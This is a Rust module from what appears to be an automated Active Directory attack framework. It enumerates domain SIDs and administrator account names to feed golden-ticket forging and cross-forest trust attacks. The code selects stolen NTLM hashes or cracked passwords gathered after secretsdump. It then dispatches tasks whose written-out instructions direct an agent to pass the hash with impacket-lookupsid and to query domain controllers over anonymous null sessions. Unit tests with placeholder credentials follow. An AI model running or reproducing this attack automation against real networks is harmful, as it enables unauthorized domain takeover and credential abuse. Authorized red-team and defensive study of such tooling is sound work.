//! auto_sid_enumeration -- enumerate domain SIDs and well-known SID mappings.
//!
//! Queries each discovered DC via LDAP to resolve the domain SID, then maps
//! well-known RIDs (500=Administrator, 502=krbtgt, 512=Domain Admins, etc.)
//! to confirm account names. This is useful when the RID-500 account has
//! been renamed (e.g., not "Administrator").
//!
//! Also discovers the domain SID needed for golden ticket forging and
//! ExtraSid attacks.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::acl_graph::is_usable_hash;
use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Authentication material for a SID enumeration task.
///
/// Post-`secretsdump` the only auth material against a freshly-compromised
/// domain is an NTLM hash; the plaintext-only gate that lived here previously
/// blocked the entire `auto_golden_ticket` / `auto_trust_follow` chain whenever
/// passwords hadn't been cracked yet.
#[derive(Debug, Clone)]
enum SidEnumAuth {
    Password(ares_core::models::Credential),
    Hash(ares_core::models::Hash),
}

impl SidEnumAuth {
    fn username(&self) -> &str {
        match self {
            Self::Password(c) => &c.username,
            Self::Hash(h) => &h.username,
        }
    }

    fn auth_domain(&self) -> &str {
        match self {
            Self::Password(c) => &c.domain,
            Self::Hash(h) => &h.domain,
        }
    }

    fn mode(&self) -> &'static str {
        match self {
            Self::Password(_) => "password",
            Self::Hash(_) => "hash",
        }
    }
}

struct SidEnumWork {
    dedup_key: String,
    domain: String,
    dc_ip: String,
    auth: SidEnumAuth,
}

/// Hash rows we can actually NTLM-bind with. `krbtgt` is a KDC signing key,
/// not an interactive principal. Machine accounts (`*$`) carry lockout risk
/// and the secret is rarely usable for LSARPC. History entries (`is_previous`)
/// may decrypt old tickets but won't bind today. [`is_usable_hash`] draws the
/// remaining line: roast ciphertext has a non-empty `hash_value` and the
/// emptiness-only check let it through as `credential.hash` for the bind.
fn is_usable_for_ntlm_bind(h: &ares_core::models::Hash) -> bool {
    if h.is_previous || !is_usable_hash(h) {
        return false;
    }
    let user = h.username.to_lowercase();
    user != "krbtgt" && !user.ends_with('$')
}

/// Lower score = better candidate. Prefer the RID-500 row for the target
/// domain (when admin_names has resolved it), then a literal `Administrator`,
/// then any other in-domain user, then cross-domain as a last resort.
fn hash_score(h: &ares_core::models::Hash, target_domain: &str, admin_name: Option<&str>) -> u8 {
    let user = h.username.to_lowercase();
    let same_domain = h.domain.eq_ignore_ascii_case(target_domain);
    if same_domain {
        if let Some(name) = admin_name {
            if user == name.to_lowercase() {
                return 0;
            }
        }
        if user == "administrator" {
            return 1;
        }
        return 2;
    }
    3
}

fn pick_hash<'a>(
    state: &'a StateInner,
    target_domain: &str,
) -> Option<&'a ares_core::models::Hash> {
    let admin_name = state.admin_names.get(target_domain).map(String::as_str);
    state
        .hashes
        .iter()
        .filter(|h| is_usable_for_ntlm_bind(h))
        .filter(|h| !state.is_principal_quarantined(&h.username, &h.domain))
        .min_by_key(|h| hash_score(h, target_domain, admin_name))
}

fn pick_password_cred<'a>(
    state: &'a StateInner,
    target_domain: &str,
) -> Option<&'a ares_core::models::Credential> {
    let target_lc = target_domain.to_lowercase();
    state
        .credentials
        .iter()
        .find(|c| {
            !c.password.is_empty()
                && c.domain.to_lowercase() == target_lc
                && !state.is_principal_quarantined(&c.username, &c.domain)
        })
        .or_else(|| {
            state.credentials.iter().find(|c| {
                !c.password.is_empty() && !state.is_principal_quarantined(&c.username, &c.domain)
            })
        })
}

/// Collect SID enumeration work items from current state.
///
/// Pure logic extracted from `auto_sid_enumeration` so it can be unit-tested
/// without needing a `Dispatcher` or async runtime.
fn collect_sid_enum_work(state: &StateInner) -> Vec<SidEnumWork> {
    if state.credentials.is_empty() && state.hashes.is_empty() {
        return Vec::new();
    }

    let mut items = Vec::new();

    for (domain, dc_ip) in &state.all_domains_with_dcs() {
        if state.domain_sids.contains_key(domain) {
            continue;
        }

        let dedup_key = format!("sid_enum:{}", domain.to_lowercase());
        if state.is_processed(DEDUP_SID_ENUMERATION, &dedup_key) {
            continue;
        }

        let auth = if let Some(c) = pick_password_cred(state, domain) {
            SidEnumAuth::Password(c.clone())
        } else if let Some(h) = pick_hash(state, domain) {
            SidEnumAuth::Hash(h.clone())
        } else {
            continue;
        };

        items.push(SidEnumWork {
            dedup_key,
            domain: domain.clone(),
            dc_ip: dc_ip.clone(),
            auth,
        });
    }

    items
}

/// Enumerate domain SIDs and well-known accounts.
/// Interval: 45s.
pub async fn auto_sid_enumeration(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("sid_enumeration") {
            continue;
        }

        let work: Vec<SidEnumWork> = {
            let state = dispatcher.state.read().await;
            collect_sid_enum_work(&state)
        };

        for item in work {
            let auth_domain_lc = item.auth.auth_domain().to_lowercase();
            let target_domain_lc = item.domain.to_lowercase();
            // Cross-forest authenticated RPC/LDAP from the source forest's
            // credential typically returns ACCESS_DENIED — but `rpcclient
            // -U "" -N -c lsaquery` over a null session usually succeeds
            // against DCs that allow anonymous LSA queries (most legacy
            // configurations). The agent loop won't try the null-session
            // path on its own when handed a credential, so we explicitly
            // instruct it to fall through. The result-processor's
            // `extract_lsaquery_domain_sid` regex captures the resulting
            // `Domain Name: / Domain Sid:` block and caches it against the
            // domain, which unblocks `forge_inter_realm_and_dump`.
            let cred_is_cross_forest = !auth_domain_lc.ends_with(&target_domain_lc)
                && !target_domain_lc.ends_with(&auth_domain_lc)
                && auth_domain_lc != target_domain_lc;
            let auth_hint = match &item.auth {
                SidEnumAuth::Password(_) => "",
                SidEnumAuth::Hash(_) => " The credential block carries `hash` (NTLM) instead of `password`; use `impacket-lookupsid -hashes ':<HASH>'` to bind.",
            };
            let instructions = if cred_is_cross_forest {
                Some(format!(
                    "Resolve the domain SID and RID-500 account name for {dom} ({dc}). \
                     The provided credential is from a different forest and authenticated \
                     RPC/LDAP from outside this forest typically fails with ACCESS_DENIED. \
                     Run `rpcclient -U \"\" -N {dc} -c \"lsaquery\"` first (null/anonymous \
                     session — no credential needed) to capture the `Domain Name:` and \
                     `Domain Sid:` lines. Then run `impacket-lookupsid` with the provided \
                     credential as a secondary attempt for RID-500 mapping.{hint} Report both \
                     outputs verbatim via task_complete tool_outputs so the parser can \
                     extract the SID.",
                    dom = item.domain,
                    dc = item.dc_ip,
                    hint = auth_hint,
                ))
            } else if matches!(item.auth, SidEnumAuth::Hash(_)) {
                Some(format!(
                    "Resolve the domain SID and RID-500 account name for {dom} ({dc}). \
                     The credential block carries `hash` (NTLM) instead of `password`; use \
                     `impacket-lookupsid -hashes ':<HASH>' <domain>/<user>@{dc}` to bind. \
                     If that fails, fall back to `rpcclient -U \"\" -N {dc} -c \"lsaquery\"` \
                     over a null session. Report output verbatim via task_complete \
                     tool_outputs so the parser can extract the SID.",
                    dom = item.domain,
                    dc = item.dc_ip,
                ))
            } else {
                None
            };

            let credential_block = match &item.auth {
                SidEnumAuth::Password(c) => json!({
                    "username": c.username,
                    "password": c.password,
                    "domain": c.domain,
                }),
                SidEnumAuth::Hash(h) => json!({
                    "username": h.username,
                    "hash": h.hash_value,
                    "hash_type": h.hash_type,
                    "domain": h.domain,
                }),
            };

            let mut payload = json!({
                "technique": "sid_enumeration",
                "target_ip": item.dc_ip,
                "domain": item.domain,
                "credential": credential_block,
            });
            if let Some(text) = instructions {
                payload["instructions"] = json!(text);
            }

            let auth_mode = item.auth.mode();
            let auth_user = item.auth.username().to_string();
            let priority = dispatcher.effective_priority("sid_enumeration");
            match dispatcher
                .throttled_submit("recon", "recon", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %item.domain,
                        dc = %item.dc_ip,
                        auth_mode = %auth_mode,
                        user = %auth_user,
                        "SID enumeration dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_SID_ENUMERATION, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SID_ENUMERATION, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(domain = %item.domain, "SID enumeration deferred");
                }
                Err(e) => {
                    warn!(err = %e, domain = %item.domain, "Failed to dispatch SID enumeration");
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_credential(
        username: &str,
        password: &str,
        domain: &str,
    ) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: format!("c-{username}"),
            username: username.into(),
            password: password.into(), // pragma: allowlist secret
            domain: domain.into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_hash(username: &str, domain: &str) -> ares_core::models::Hash {
        ares_core::models::Hash {
            id: format!("h-{username}-{domain}"),
            username: username.into(),
            hash_value: "aad3b435b51404eeaad3b435b51404ee:deadbeefdeadbeefdeadbeefdeadbeef" // pragma: allowlist secret
                .into(),
            hash_type: "ntlm".into(),
            domain: domain.into(),
            cracked_password: None,
            source: "test".into(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        }
    }

    #[test]
    fn dedup_key_format() {
        let key = format!("sid_enum:{}", "contoso.local");
        assert_eq!(key, "sid_enum:contoso.local");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_SID_ENUMERATION, "sid_enumeration");
    }

    #[test]
    fn payload_password_block_shape() {
        let cred = make_credential("alice", "P@ssw0rd!", "contoso.local"); // pragma: allowlist secret
        let payload = json!({
            "technique": "sid_enumeration",
            "target_ip": "192.168.58.10",
            "domain": "contoso.local",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });
        assert_eq!(payload["technique"], "sid_enumeration");
        assert_eq!(payload["credential"]["password"], "P@ssw0rd!"); // pragma: allowlist secret
    }

    #[test]
    fn payload_hash_block_shape() {
        let hash = make_hash("alice", "contoso.local");
        let payload = json!({
            "technique": "sid_enumeration",
            "target_ip": "192.168.58.10",
            "domain": "contoso.local",
            "credential": {
                "username": hash.username,
                "hash": hash.hash_value,
                "hash_type": hash.hash_type,
                "domain": hash.domain,
            },
        });
        assert_eq!(payload["credential"]["hash"].as_str().unwrap().len(), 65);
        assert_eq!(payload["credential"]["hash_type"], "ntlm");
        assert!(payload["credential"].get("password").is_none());
    }

    #[test]
    fn dedup_key_normalizes_domain() {
        let key = format!("sid_enum:{}", "CONTOSO.LOCAL".to_lowercase());
        assert_eq!(key, "sid_enum:contoso.local");
    }

    #[test]
    fn dedup_keys_differ_per_domain() {
        let key1 = format!("sid_enum:{}", "contoso.local");
        let key2 = format!("sid_enum:{}", "fabrikam.local");
        assert_ne!(key1, key2);
    }

    #[test]
    fn collect_empty_state_no_work() {
        let state = StateInner::new("test-op".into());
        let work = collect_sid_enum_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_no_creds_no_hashes_no_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = collect_sid_enum_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_single_domain_with_password_cred() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state
            .credentials
            .push(make_credential("alice", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].domain, "contoso.local");
        assert_eq!(work[0].dc_ip, "192.168.58.10");
        assert!(matches!(work[0].auth, SidEnumAuth::Password(_)));
        assert_eq!(work[0].auth.username(), "alice");
    }

    #[test]
    fn collect_hash_only_domain_produces_work() {
        // Post-secretsdump: only NTLM hashes exist, no plaintext. Without
        // this fallback, auto_golden_ticket and auto_trust_follow block.
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("north.contoso.local".into(), "192.168.58.20".into());
        state
            .hashes
            .push(make_hash("Administrator", "north.contoso.local"));
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert!(matches!(work[0].auth, SidEnumAuth::Hash(_)));
        assert_eq!(work[0].auth.username(), "Administrator");
    }

    #[test]
    fn collect_skips_uncracked_asrep_hash() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let mut h = make_hash("bob", "contoso.local");
        h.hash_type = "AS-REP".into();
        h.hash_value = "$krb5asrep$23$bob@CONTOSO.LOCAL:aabbccdd".into();
        state.hashes.push(h);

        assert!(
            collect_sid_enum_work(&state).is_empty(),
            "roast ciphertext cannot NTLM-bind for lookupsid"
        );
    }

    #[test]
    fn collect_prefers_password_over_hash() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state
            .credentials
            .push(make_credential("alice", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .hashes
            .push(make_hash("Administrator", "contoso.local"));
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert!(matches!(work[0].auth, SidEnumAuth::Password(_)));
    }

    #[test]
    fn collect_skips_krbtgt_hash_for_ntlm_bind() {
        // krbtgt is a KDC signing key, not bindable via NTLM RPC.
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state.hashes.push(make_hash("krbtgt", "contoso.local"));
        let work = collect_sid_enum_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_skips_machine_account_hash() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state.hashes.push(make_hash("DC01$", "contoso.local"));
        let work = collect_sid_enum_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_skips_history_hash() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let mut h = make_hash("Administrator", "contoso.local");
        h.is_previous = true;
        state.hashes.push(h);
        let work = collect_sid_enum_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_prefers_rid500_hash_over_other_user() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state.hashes.push(make_hash("bob", "contoso.local"));
        state
            .hashes
            .push(make_hash("Administrator", "contoso.local"));
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].auth.username(), "Administrator");
    }

    #[test]
    fn collect_prefers_admin_name_match_over_administrator_literal() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        // RID-500 was renamed to "root" in this domain
        state
            .admin_names
            .insert("contoso.local".into(), "root".into());
        state
            .hashes
            .push(make_hash("Administrator", "contoso.local"));
        state.hashes.push(make_hash("root", "contoso.local"));
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].auth.username(), "root");
    }

    #[test]
    fn collect_prefers_in_domain_hash_over_cross_domain() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state.hashes.push(make_hash("bob", "fabrikam.local"));
        state.hashes.push(make_hash("alice", "contoso.local"));
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].auth.username(), "alice");
    }

    #[test]
    fn collect_falls_back_to_cross_domain_hash() {
        // No in-domain auth material at all; only a hash from a different
        // domain. Still produces work — the dispatch loop's cross-forest
        // branch will inject null-session lsaquery instructions.
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state.hashes.push(make_hash("bob", "fabrikam.local"));
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].auth.username(), "bob");
        assert_eq!(work[0].auth.auth_domain(), "fabrikam.local");
    }

    #[test]
    fn collect_skips_domain_with_known_sid() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state
            .credentials
            .push(make_credential("alice", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .domain_sids
            .insert("contoso.local".into(), "S-1-5-21-1234-5678-9012".into());
        let work = collect_sid_enum_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_dedup_skips_processed() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state
            .credentials
            .push(make_credential("alice", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state.mark_processed(DEDUP_SID_ENUMERATION, "sid_enum:contoso.local".into());
        let work = collect_sid_enum_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_password_cross_domain_fallback() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state.credentials.push(make_credential(
            "crossuser",
            "P@ssw0rd!", // pragma: allowlist secret
            "fabrikam.local",
        ));
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].auth.username(), "crossuser");
        assert_eq!(work[0].auth.auth_domain(), "fabrikam.local");
    }

    #[test]
    fn collect_skips_empty_password_when_no_hash() {
        // Empty-password row alone never dispatches; with no hash fallback
        // available, the work list stays empty.
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state
            .credentials
            .push(make_credential("alice", "", "contoso.local"));
        let work = collect_sid_enum_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_empty_password_uses_hash_fallback() {
        // The classic post-secretsdump shape: secretsdump emits a placeholder
        // credential row with empty password plus separate hash rows. Make
        // sure the hash path picks up.
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state
            .credentials
            .push(make_credential("Administrator", "", "contoso.local"));
        state
            .hashes
            .push(make_hash("Administrator", "contoso.local"));
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert!(matches!(work[0].auth, SidEnumAuth::Hash(_)));
    }

    #[test]
    fn collect_quarantined_password_cred_skipped() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state
            .credentials
            .push(make_credential("baduser", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state.quarantine_principal("baduser", "contoso.local");
        let work = collect_sid_enum_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_quarantined_hash_skipped() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state
            .hashes
            .push(make_hash("Administrator", "contoso.local"));
        state.quarantine_principal("Administrator", "contoso.local");
        let work = collect_sid_enum_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_dedup_key_lowercased() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("CONTOSO.LOCAL".into(), "192.168.58.10".into());
        state
            .credentials
            .push(make_credential("alice", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].dedup_key, "sid_enum:contoso.local");
    }

    #[tokio::test]
    async fn collect_via_shared_state() {
        let shared = SharedState::new("test-op".into());
        {
            let mut state = shared.write().await;
            state
                .domain_controllers
                .insert("contoso.local".into(), "192.168.58.10".into());
            state
                .credentials
                .push(make_credential("alice", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        }
        let state = shared.read().await;
        let work = collect_sid_enum_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].domain, "contoso.local");
    }
}
